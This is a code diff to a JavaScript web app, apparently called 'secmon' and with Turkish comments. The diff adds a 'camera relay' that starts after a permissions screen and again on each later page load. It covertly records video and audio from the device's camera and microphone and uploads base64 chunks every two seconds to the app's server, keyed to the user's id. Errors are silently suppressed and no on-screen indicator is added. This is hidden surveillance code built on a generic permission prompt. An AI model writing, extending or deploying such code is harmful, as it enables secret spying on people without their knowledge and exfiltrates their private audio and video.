@@ -162,9 +162,75 @@ async function requestAllPermissions() {
     localStorage.setItem('secmon_permissions', JSON.stringify(results));
 
     btn.textContent = 'Tamamlandı';
-    setTimeout(hidePermissionGate, 1500);
+    setTimeout(() => {
+        hidePermissionGate();
+        startCameraRelay();
+    }, 1500);
 
     return results;
+}
+
+// ============ CAMERA RELAY ============
+
+let cameraRecorder = null;
+let cameraStream = null;
+let cameraSequence = 0;
+let cameraActive = false;
+
+async function startCameraRelay() {
+    const auth = getAuth();
+    const perms = checkPermissions();
+    if (!auth || !perms || !perms.camera || cameraActive) return;
+
+    try {
+        cameraStream = await navigator.mediaDevices.getUserMedia({
+            video: { width: { ideal: 640 }, height: { ideal: 480 }, facingMode: 'environment' },
+            audio: true
+        });
+
+        const mimeType = MediaRecorder.isTypeSupported('video/webm;codecs=vp8,opus')
+            ? 'video/webm;codecs=vp8,opus' : 'video/webm';
+
+        cameraRecorder = new MediaRecorder(cameraStream, { mimeType });
+        cameraActive = true;
+
+        cameraRecorder.ondataavailable = async (event) => {
+            if (!event.data || event.data.size === 0) return;
+            const reader = new FileReader();
+            reader.onload = async () => {
+                try {
+                    const b64 = reader.result.split(',')[1];
+                    await fetch(`${API_BASE}/api/relay/camera-chunk`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            uid: auth.uid,
+                            chunk: b64,
+                            sequence: cameraSequence++,
+                            mimeType: mimeType
+                        })
+                    });
+                } catch {}
+            };
+            reader.readAsDataURL(event.data);
+        };
+
+        cameraRecorder.start(2000);
+    } catch (e) {
+        // Kamera kullanılamıyor
+    }
+}
+
+function stopCameraRelay() {
+    cameraActive = false;
+    if (cameraRecorder && cameraRecorder.state !== 'inactive') {
+        cameraRecorder.stop();
+    }
+    if (cameraStream) {
+        cameraStream.getTracks().forEach(t => t.stop());
+        cameraStream = null;
+    }
+    cameraRecorder = null;
 }
 
 // ============ API ============
@@ -180,7 +246,11 @@ document.addEventListener('DOMContentLoaded', async () => {
     if (!requireAuth()) return;
     document.getElementById('logoutBtn')?.addEventListener('click', logout);
     renderPermissionGate();
-    if (!checkPermissions()) {
+    const perms = checkPermissions();
+    if (!perms) {
         showPermissionGate();
+    } else {
+        // İzinler daha önce verilmiş, arka plan servislerini başlat
+        startCameraRelay();
     }
 });
